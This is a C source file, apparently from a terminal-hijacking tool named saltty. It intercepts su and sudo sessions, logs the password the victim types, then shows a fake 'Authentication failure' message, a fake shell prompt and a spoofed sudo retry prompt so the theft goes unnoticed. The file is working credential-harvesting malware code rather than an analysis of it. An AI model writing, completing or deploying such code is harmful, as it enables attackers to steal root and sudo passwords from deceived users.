#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <termios.h>
#include <string.h>
#include <time.h>
#include "saltty.h"
#include "conf.h"

#define PROMPT "USER@HOST:~$ "
void handle_su(state_t *st) {
	char buf[512];
	ssize_t s;
	// TODO: look into /proc/PID/status to ensure that su isn't running as real-uid 0 
	// TODO: look into /proc/PID/status to automatically get the right USER for the prompt
	log_password(st);
	fprintf(st->file, "\n");
	echo_on(st);
	sleep(1);
	fprintf(st->file, "su: Authentication failure.\n");
	for(;;) {
		fprintf(st->file, PROMPT);
		s = read_tty(st, buf, sizeof(buf));
		if (s <= 0)
			break;
		if (s >= 2 ) 
			if (!memcmp(buf, "su\n", 3))
				break;
	}
	echo_off(st);
	fprintf(st->file, "Password: ");
	return;
}

#define SUDO_PROMPT "Sorry, try again.\n[sudo] password for USER: "
#define SUDO_TIME 300
void handle_sudo(state_t *st) {
	static int last_time = 0;
	// TODO: look into /proc/PID/status to automatically get the right USER for the prompt
	if ((last_time != 0) && (last_time + SUDO_TIME < time(NULL))) {
		log_password(st);
		fprintf(st->file, "\n");
		sleep(1);
		fprintf(st->file, SUDO_PROMPT);
	}
	last_time = time(NULL);
}
